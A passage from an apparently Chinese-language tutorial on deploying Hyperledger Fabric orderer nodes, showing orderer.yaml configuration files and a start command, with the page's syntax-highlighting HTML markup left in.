class="hljs-comment"># TLS enabled</span><br>        Enabled: <span class="hljs-literal">false</span><br><br>        <span class="hljs-comment"># Certificate is the location of the PEM encoded TLS certificate</span><br>        Certificate:<br><br>        <span class="hljs-comment"># PrivateKey points to the location of the PEM-encoded key</span><br>        PrivateKey:<br><br>        <span class="hljs-comment"># Most admin service endpoints require client authentication when TLS</span><br>        <span class="hljs-comment"># is enabled. ClientAuthRequired requires client certificate authentication</span><br>        <span class="hljs-comment"># at the TLS layer to access all resources.</span><br>        <span class="hljs-comment">#</span><br>        <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> When TLS is enabled, the admin endpoint requires mutual TLS. The</span><br>        <span class="hljs-comment"># orderer will panic on startup if this value is set to false.</span><br>        ClientAuthRequired: <span class="hljs-literal">true</span><br><br>        <span class="hljs-comment"># Paths to PEM encoded ca certificates to trust for client authentication</span><br>        ClientRootCAs: []<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   Channel participation API Configuration</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This provides the channel participation API configuration for the orderer.</span><br><span class="hljs-comment">#   - Channel participation uses the ListenAddress and TLS settings of the Admin</span><br><span class="hljs-comment">#     service.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>ChannelParticipation:<br>    <span class="hljs-comment"># Channel participation API is enabled.</span><br>    Enabled: <span class="hljs-literal">false</span><br><br>    <span class="hljs-comment"># The maximum size of the request body when joining a channel.</span><br>    MaxRequestBodySize: <span class="hljs-number">1</span> MB<br><br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   Consensus Configuration</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This section contains config options for a consensus plugin. It is opaque</span><br><span class="hljs-comment">#     to orderer, and completely up to consensus implementation to make use of.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>Consensus:<br>    <span class="hljs-comment"># The allowed key-value pairs here depend on consensus plugin. For etcd/raft,</span><br>    <span class="hljs-comment"># we use following options:</span><br><br>    <span class="hljs-comment"># WALDir specifies the location at which Write Ahead Logs for etcd/raft are</span><br>    <span class="hljs-comment"># stored. Each channel will have its own subdir named after channel ID.</span><br>    WALDir: /var/hyperledger/production/orderer0/etcdraft/wal<br><br>    <span class="hljs-comment"># SnapDir specifies the location at which snapshots for etcd/raft are</span><br>    <span class="hljs-comment"># stored. Each channel will have its own subdir named after channel ID.</span><br>    SnapDir: /var/hyperledger/production/orderer0/etcdraft/snapshot<br>启动 orderer0 节点 :<br><br>nohup ./orderer start &gt; orderer0-log.log <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &amp;<br>部署 orderer1 节点<br>编辑 orderer.yaml 文件：<br><br><span class="hljs-comment"># Copyright IBM Corp. All Rights Reserved.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># SPDX-License-Identifier: Apache-2.0</span><br><span class="hljs-comment">#</span><br><br>---<br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   Orderer Configuration</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This controls the type and configuration of the orderer.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>General:<br>    <span class="hljs-comment"># Listen address: The IP on which to bind to listen.</span><br>    ListenAddress: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.66</span><br><br>    <span class="hljs-comment"># Listen port: The port on which to bind to listen.</span><br>    ListenPort: <span class="hljs-number">8050</span><br><br>    <span class="hljs-comment"># TLS: TLS settings for the GRPC server.</span><br>    TLS:<br>        <span class="hljs-comment"># Require server-side TLS</span><br>        Enabled: <span class="hljs-literal">true</span><br>        <span class="hljs-comment"># PrivateKey governs the file location of the private key of the TLS certificate.</span><br>        PrivateKey: <span class="hljs-regexp">/usr/project/fabric/3orderer-org1-2peer-org2-2peer-network/</span>/crypto-config/ordererOrganizations/example.com/orderers/orderer1.example.com/tls/server.key<br>        <span class="hljs-comment"># Certificate governs the file location of the server TLS certificate.</span><br>        Certificate: /usr/project/fabric/<span class="hljs-number">3</span>orderer-org1<span class="hljs-number">-2</span>peer-org2<span class="hljs-number">-2</span>peer-network/crypto-config/ordererOrganizations/example.com/orderers/orderer1.example.com/tls/server.crt<br>        <span class="hljs-comment"># RootCAs contains a list of additional root certificates used for verifying certificates</span><br>        <span class="hljs-comment"># of other orderer nodes during outbound connections.</span><br>        <span class="hljs-comment"># It is not required to be set, but can be used to augment the set of TLS CA certificates</span><br>        <span class="hljs-comment"># available from the MSPs of each channel’s configuration.</span><br>        RootCAs:<br>          - /usr/project/fabric/<span class="hljs-number">3</span>orderer-org1<span class="hljs-number">-2</span>peer-org2<span class="hljs-number">-2</span>peer-network/crypto-config/ordererOrganizations/example.com/orderers/orderer1.example.com/tls/ca.crt<br>        <span class="hljs-comment"># Require client certificates / mutual TLS for inbound connections.</span><br>        ClientAuthRequired: <span class="hljs-literal">false</span><br>        <span class="hljs-comment"># If mutual TLS is enabled, ClientRootCAs contains a list of additional root certificates</span><br>        <span class="hljs-comment"># used for verifying certificates of client connections.</span><br>        <span class="hljs-comment"># It is not required to be set, but can be used to augment the set of TLS CA certificates</span><br>        <span class="hljs-comment"># available from the MSPs of each channel’s configuration.</span><br>        ClientRootCAs:<br>    <span class="hljs-comment"># Keepalive settings for the GRPC server.</span><br>    Keepalive:<br>        <span class="hljs-comment"># ServerMinInterval is the minimum permitted time between client pings.</span><br>        <span class="hljs-comment"># If clients send pings more frequently, the server will</span><br>        <span class="hljs-comment"># disconnect them.</span><br>        ServerMinInterval: <span class="hljs-number">60</span>s<br>        <span class="hljs-comment"># ServerInterval is the time between pings to clients.</span><br>        ServerInterval: <span class="hljs-number">7200</span>s<br>        <span class="hljs-comment"># ServerTimeout is the duration the server waits for a response from</span><br>        <span class="hljs-comment"># a client before closing the connection.</span><br>        ServerTimeout: <span class="hljs-number">20</span>s<br><br>    <span class="hljs-comment"># Since all nodes should be consistent it is recommended to keep</span><br>    <span class="hljs-comment"># the default value of 100MB for MaxRecvMsgSize &amp; MaxSendMsgSize</span><br>    <span class="hljs-comment"># Max message size in bytes the GRPC server and client can receive</span><br>    MaxRecvMsgSize: <span class="hljs-number">104857600</span><br>    <span class="hljs-comment"># Max message size in bytes the GRPC server and client can send</span><br>    MaxSendMsgSize: <span class="hljs-number">104857600</span><br><br>    <span class="hljs-comment"># Cluster settings for ordering service nodes that communicate with other ordering service nodes</span><br>    <span class="hljs-comment"># such as Raft based ordering service.</span><br>    Cluster:<br>        <span class="hljs-comment"># SendBufferSize is the maximum number of messages in the egress buffer.</span><br>        <span class="hljs-comment"># Consensus messages are dropped if the buffer is full, and transaction</span><br>        <span class="hljs-comment"># messages are waiting for space to be freed.</span><br>        SendBufferSize: <span class="hljs-number">10</span><br><br>        <span class="hljs-comment"># ClientCertificate governs the file location of the client TLS certificate</span><br>        <span class="hljs-comment"># used to establish mutual TLS connections with other ordering service nodes.</span><br>        <span class="hljs-comment"># If not set, the server General.TLS.Certificate is re-used.</span><br>        ClientCertificate: /usr/project/fabric/<span class="hljs-number">3</span>orderer-org1<span class="hljs-number">-2</span>peer-org2<span class="hljs-number">-2</span>peer-network/crypto-config/ordererOrganizations/example.com/orderers/orderer1.example.com/tls/server.crt<br>        <span class="hljs-comment"># ClientPrivateKey governs the file location of the private key of the client TLS certificate.</span><br>        <span class="hljs-comment"># If not set, the server General.TLS.PrivateKey is re-used.</span><br>        ClientPrivateKey: /usr/project/fabric/<span class="hljs-number">3</span>orderer-org1<span class="hljs-number">-2</span>peer-org2<span class="hljs-number">-2</span>peer-network/crypto-config/ordererOrganizations/example.com/orderers/orderer1.example.com/tls/server.key<br><br>        <span class="hljs-comment"># The below 4 properties should be either set together, or be unset together.</span><br>        <span class="hljs-comment"># If they are set, then the orderer node uses a separate listener for intra-cluster</span><br>        <span class="hljs-comment"># communication. If they are unset, then the general orderer listener is used.</span><br>        <span class="hljs-comment"># This is useful if you want to use a different TLS server certificates on the</span><br>        <span class="hljs-comment"># client-facing and the intra-cluster listeners.</span><br><br>        <span class="hljs-comment"># ListenPort defines the port on which the cluster listens to connections.</span><br>        ListenPort:<br>        <span class="hljs-comment"># ListenAddress defines the IP on which to listen to intra-cluster communication.</span><br>        ListenAddress:<br>        <span class="hljs-comment"># ServerCertificate defines the file location of the server TLS certificate used for intra-cluster</span><br>        <span class="hljs-comment"># communication.</span><br>        ServerCertificate:<br>        <span class="hljs-comment"># ServerPrivateKey defines the file location of the private key of the TLS certificate.</span><br>        ServerPrivateKey:<br><br>    <span class="hljs-comment"># Bootstrap method: The method by which to obtain the bootstrap block</span><br>    <span class="hljs-comment"># system channel is specified. The option can be one of:</span><br>    <span class="hljs-comment">#   &quot;file&quot; - path to a file containing the genesis block or config block of system channel</span><br>    <span class="hljs-comment">#   &quot;none&quot; - allows an orderer to start without a system channel configuration</span><br>    BootstrapMethod: file<br><br>    <span class="hljs-comment"># Bootstrap file: The file containing the bootstrap block to use when</span><br>    <span class="hljs-comment"># initializing the orderer system channel and BootstrapMethod is set to</span><br>    <span class="hljs-comment"># &quot;file&quot;.  The bootstrap file can be the genesis block, and it can also be</span><br>    <span class="hljs-comment"># a config block for late bootstrap of some consensus methods like Raft.</span><br>    <span class="hljs-comment"># Generate a genesis block by updating $FABRIC_CFG_PATH/configtx.yaml and</span><br>    <span class="hljs-comment"># using configtxgen command with &quot;-outputBlock&quot; option.</span><br>    <span class="hljs-comment"># Defaults to file &quot;genesisblock&quot; (in $FABRIC_CFG_PATH directory) if not specified.</span><br>    BootstrapFile: /usr/project/fabric/<span class="hljs-number">3</span>orderer-org1<span class="hljs-number">-2</span>peer-org2<span class="hljs-number">-2</span>peer-network/channel-artifacts/orderer.genesis.block<br><br>    <span class="hljs-comment"># LocalMSPDir is where to find the private crypto material needed by the</span><br>    <span class="hljs-comment"># orderer. It is set relative here as a default for dev environments but</span><br>    <span class="hljs-comment"># should be changed to the real location in production.</span><br>    LocalMSPDir: /usr/project/fabric/<span class="hljs-number">3</span>orderer-org1<span class="hljs-number">-2</span>peer-org2<span class="hljs-number">-2</span>peer-network/crypto-config/ordererOrganizations/example.com/orderers/orderer1.example.com/msp<br><br>    <span class="hljs-comment"># LocalMSPID is the identity to register the local MSP material with the MSP</span><br>    <span class="hljs-comment"># manager. IMPORTANT: The local MSP ID of an orderer needs to match the MSP</span><br>    <span class="hljs-comment"># ID of one of the organizations defined in the orderer system channel&#x27;s</span><br>    <span class="hljs-comment"># /Channel/Orderer configuration. The sample organization defined in the</span><br>    <span class="hljs-comment"># sample configuration provided has an MSP ID of &quot;SampleOrg&quot;.</span><br>    LocalMSPID: OrdererMSP<br><br>    <span class="hljs-comment"># Enable an HTTP service for Go &quot;pprof&quot; profiling as documented at:</span><br>    <span class="hljs-comment"># https://golang.org/pkg/net/http/pprof</span><br>    Profile:<br>        Enabled: <span class="hljs-literal">false</span><br>        Address: <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">6060</span><br><br>    <span class="hljs-comment"># BCCSP configures the blockchain crypto service providers.</span><br>    BCCSP:<br>        <span class="hljs-comment"># Default specifies the preferred blockchain crypto service provider</span><br>        <span class="hljs-comment"># to use. If the preferred provider is not available, the software</span><br>        <span class="hljs-comment"># based provider (&quot;SW&quot;) will be used.</span><br>        <span class="hljs-comment"># Valid providers are:</span><br>        <span class="hljs-comment">#  - SW: a software based crypto provider</span><br>        <span class="hljs-comment">#  - PKCS11: a CA hardware security module crypto provider.</span><br>        Default: SW<br><br>        <span class="hljs-comment"># SW configures the software based blockchain crypto provider.</span><br>        SW:<br>            <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> The default Hash and Security level needs refactoring to be</span><br>            <span class="hljs-comment"># fully configurable. Changing these defaults requires coordination</span><br>            <span class="hljs-comment"># SHA2 is hardcoded in several places, not only BCCSP</span><br>            Hash: SHA2<br>            Security: <span class="hljs-number">256</span><br>            <span class="hljs-comment"># Location of key store. If this is unset, a location will be</span><br>            <span class="hljs-comment"># chosen using: &#x27;LocalMSPDir&#x27;/keystore</span><br>            FileKeyStore:<br>                KeyStore:<br><br>        <span class="hljs-comment"># Settings for the PKCS#11 crypto provider (i.e. when DEFAULT: PKCS11)</span><br>        PKCS11:<br>            <span class="hljs-comment"># Location of the PKCS11 module library</span><br>            Library:<br>            <span class="hljs-comment"># Token Label</span><br>            Label:<br>            <span class="hljs-comment"># User PIN</span><br>            Pin:<br>            Hash:<br>            Security:<br>            FileKeyStore:<br>                KeyStore:<br><br>    <span class="hljs-comment"># Authentication contains configuration parameters related to authenticating</span><br>    <span class="hljs-comment"># client messages</span><br>    Authentication:<br>        <span class="hljs-comment"># the acceptable difference between the current server time and the</span><br>        <span class="hljs-comment"># client&#x27;s time as specified in a client request message</span><br>        TimeWindow: <span class="hljs-number">15</span>m<br><br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   SECTION: File Ledger</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This section applies to the configuration of the file ledger.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>FileLedger:<br><br>    <span class="hljs-comment"># Location: The directory to store the blocks in.</span><br>    Location: /var/hyperledger/production/orderer1<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   SECTION: Kafka</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This section applies to the configuration of the Kafka-based orderer, and</span><br><span class="hljs-comment">#     its interaction with the Kafka cluster.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>Kafka:<br><br>    <span class="hljs-comment"># Retry: What do if a connection to the Kafka cluster cannot be established,</span><br>    <span class="hljs-comment"># or if a metadata request to the Kafka cluster needs to be repeated.</span><br>    Retry:<br>        <span class="hljs-comment"># When a new channel is created, or when an existing channel is reloaded</span><br>        <span class="hljs-comment"># (in case of a just-restarted orderer), the orderer interacts with the</span><br>        <span class="hljs-comment"># Kafka cluster in the following ways:</span><br>        <span class="hljs-comment"># 1. It creates a Kafka producer (writer) for the Kafka partition that</span><br>        <span class="hljs-comment"># corresponds to the channel.</span><br>        <span class="hljs-comment"># 2. It uses that producer to post a no-op CONNECT message to that</span><br>        <span class="hljs-comment"># partition</span><br>        <span class="hljs-comment"># 3. It creates a Kafka consumer (reader) for that partition.</span><br>        <span class="hljs-comment"># If any of these steps fail, they will be re-attempted every</span><br>        <span class="hljs-comment"># &lt;ShortInterval&gt; for a total of &lt;ShortTotal&gt;, and then every</span><br>        <span class="hljs-comment"># &lt;LongInterval&gt; for a total of &lt;LongTotal&gt; until they succeed.</span><br>        <span class="hljs-comment"># Note that the orderer will be unable to write to or read from a</span><br>        <span class="hljs-comment"># channel until all of the steps above have been completed successfully.</span><br>        ShortInterval: <span class="hljs-number">5</span>s<br>        ShortTotal: <span class="hljs-number">10</span>m<br>        LongInterval: <span class="hljs-number">5</span>m<br>        LongTotal: <span class="hljs-number">12</span>h<br>        <span class="hljs-comment"># Affects the socket timeouts when waiting for an initial connection, a</span><br>        <span class="hljs-comment"># response, or a transmission. See Config.Net for more info:</span><br>        <span class="hljs-comment"># https://godoc.org/github.com/Shopify/sarama#Config</span><br>        NetworkTimeouts:<br>            DialTimeout: <span class="hljs-number">10</span>s<br>            ReadTimeout: <span class="hljs-number">10</span>s<br>            WriteTimeout: <span class="hljs-number">10</span>s<br>        <span class="hljs-comment"># Affects the metadata requests when the Kafka cluster is in the middle</span><br>        <span class="hljs-comment"># of a leader election.See Config.Metadata for more info:</span><br>        <span class="hljs-comment"># https://godoc.org/github.com/Shopify/sarama#Config</span><br>        Metadata:<br>            RetryBackoff: <span class="hljs-number">250</span>ms<br>            RetryMax: <span class="hljs-number">3</span><br>        <span class="hljs-comment"># What to do if posting a message to the Kafka cluster fails. See</span><br>        <span class="hljs-comment"># Config.Producer for more info:</span><br>        <span class="hljs-comment"># https://godoc.org/github.com/Shopify/sarama#Config</span><br>        Producer:<br>            RetryBackoff: <span class="hljs-number">100</span>ms<br>            RetryMax: <span class="hljs-number">3</span><br>        <span class="hljs-comment"># What to do if reading from the Kafka cluster fails. See</span><br>        <span class="hljs-comment"># Config.Consumer for more info:</span><br>        <span class="hljs-comment"># https://godoc.org/github.com/Shopify/sarama#Config</span><br>        Consumer:<br>            RetryBackoff: <span class="hljs-number">2</span>s<br>    <span class="hljs-comment"># Settings to use when creating Kafka topics.  Only applies when</span><br>    <span class="hljs-comment"># Kafka.Version is v0.10.1.0 or higher</span><br>    Topic:<br>        <span class="hljs-comment"># The number of Kafka brokers across which to replicate the topic</span><br>        ReplicationFactor: <span class="hljs-number">3</span><br>    <span class="hljs-comment"># Verbose: Enable logging for interactions with the Kafka cluster.</span><br>    Verbose: <span class="hljs-literal">false</span><br><br>    <span class="hljs-comment"># TLS: TLS settings for the orderer&#x27;s connection to the Kafka cluster.</span><br>    TLS:<br><br>      <span class="hljs-comment"># Enabled: Use TLS when connecting to the Kafka cluster.</span><br>      Enabled: <span class="hljs-literal">false</span><br><br>      <span class="hljs-comment"># PrivateKey: PEM-encoded private key the orderer will use for</span><br>      <span class="hljs-comment"># authentication.</span><br>      PrivateKey:<br>        <span class="hljs-comment"># As an alternative to specifying the PrivateKey here, uncomment the</span><br>        <span class="hljs-comment"># following &quot;File&quot; key and specify the file name from which to load the</span><br>        <span class="hljs-comment"># value of PrivateKey.</span><br>        <span class="hljs-comment">#File: path/to/PrivateKey</span><br><br>      <span class="hljs-comment"># Certificate: PEM-encoded signed public key certificate the orderer will</span><br>      <span class="hljs-comment"># use for authentication.</span><br>      Certificate:<br>        <span class="hljs-comment"># As an alternative to specifying the Certificate here, uncomment the</span><br>        <span class="hljs-comment"># following &quot;File&quot; key and specify the file name from which to load the</span><br>        <span class="hljs-comment"># value of Certificate.</span><br>        <span class="hljs-comment">#File: path/to/Certificate</span><br><br>      <span class="hljs-comment"># RootCAs: PEM-encoded trusted root certificates used to validate</span><br>      <span class="hljs-comment"># certificates from the Kafka cluster.</span><br>      RootCAs:<br>        <span class="hljs-comment"># As an alternative to specifying the RootCAs here, uncomment the</span><br>        <span class="hljs-comment"># following &quot;File&quot; key and specify the file name from which to load the</span><br>        <span class="hljs-comment"># value of RootCAs.</span><br>        <span class="hljs-comment">#File: path/to/RootCAs</span><br><br>    <span class="hljs-comment"># SASLPlain: Settings for using SASL/PLAIN authentication with Kafka brokers</span><br>    SASLPlain:<br>      <span class="hljs-comment"># Enabled: Use SASL/PLAIN to authenticate with Kafka brokers</span><br>      Enabled: <span class="hljs-literal">false</span><br>      <span class="hljs-comment"># User: Required when Enabled is set to true</span><br>      User:<br>      <span class="hljs-comment"># Password: Required when Enabled is set to true</span><br>      Password:<br><br>    <span class="hljs-comment"># Kafka protocol version used to communicate with the Kafka cluster brokers</span><br>    <span class="hljs-comment"># (defaults to 0.10.2.0 if not specified)</span><br>    Version:<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   Debug Configuration</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This controls the debugging options for the orderer</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>Debug:<br><br>    <span class="hljs-comment"># BroadcastTraceDir when set will cause each request to the Broadcast service</span><br>    <span class="hljs-comment"># for this orderer to be written to a file in this directory</span><br>    BroadcastTraceDir:<br><br>    <span class="hljs-comment"># DeliverTraceDir when set will cause each request to the Deliver service</span><br>    <span class="hljs-comment"># for this orderer to be written to a file in this directory</span><br>    DeliverTraceDir:<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   Operations Configuration</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This configures the operations server endpoint for the orderer</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>Operations:<br>    <span class="hljs-comment"># host and port for the operations server</span><br>    ListenAddress: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8444</span><br><br>    <span class="hljs-comment"># TLS configuration for the operations endpoint</span><br>    TLS:<br>        <span class="hljs-comment"># TLS enabled</span><br>        Enabled: <span class="hljs-literal">false</span><br><br>        <span class="hljs-comment"># Certificate is the location of the PEM encoded TLS certificate</span><br>        Certificate:<br><br>        <span class="hljs-comment"># PrivateKey points to the location of the PEM-encoded key</span><br>        PrivateKey:<br><br>        <span class="hljs-comment"># Most operations service endpoints require client authentication when TLS</span><br>        <span class="hljs-comment"># is enabled. ClientAuthRequired requires client certificate authentication</span><br>        <span class="hljs-comment"># at the TLS layer to access all resources.</span><br>        ClientAuthRequired: <span class="hljs-literal">false</span><br><br>        <span class="hljs-comment"># Paths to PEM encoded ca certificates to trust for client authentication</span><br>        ClientRootCAs: []<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   Metrics Configuration</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This configures metrics collection for the orderer</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>Metrics:<br>    <span class="hljs-comment"># The metrics provider is one of statsd, prometheus, or disabled</span><br>    Provider: disabled<br><br>    <span class="hljs-comment"># The statsd configuration</span><br>    Statsd:<br>      <span class="hljs-comment"># network type: tcp or udp</span><br>      Network: udp<br><br>      <span class="hljs-comment"># the statsd server address</span><br>      Address: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8125</span><br><br>      <span class="hljs-comment"># The interval at which locally cached counters and gauges are pushed</span><br>      <span class="hljs-comment"># to statsd; timings are pushed immediately</span><br>      WriteInterval: <span class="hljs-number">30</span>s<br><br>      <span class="hljs-comment"># The prefix is prepended to all emitted statsd metrics</span><br>      Prefix:<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   Admin Configuration</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This configures the admin server endpoint for the orderer</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>Admin:<br>    <span class="hljs-comment"># host and port for the admin server</span><br>    ListenAddress: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">9444</span><br><br>    <span class="hljs-comment"># TLS configuration for the admin endpoint</span><br>    TLS:<br>        <span class="hljs-comment"># TLS enabled</span><br>        Enabled: <span class="hljs-literal">false</span><br><br>        <span class="hljs-comment"># Certificate is the location of the PEM encoded TLS certificate</span><br>        Certificate:<br><br>        <span class="hljs-comment"># PrivateKey points to the location of the PEM-encoded key</span><br>        PrivateKey:<br><br>        <span class="hljs-comment"># Most admin service endpoints require client authentication when TLS</span><br>        <span class="hljs-comment"># is enabled. ClientAuthRequired requires client certificate authentication</span><br>        <span class="hljs-comment"># at the TLS layer to access all resources.</span><br>        <span class="hljs-comment">#</span><br>        <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> When TLS is enabled, the admin endpoint requires mutual TLS. The</span><br>        <span 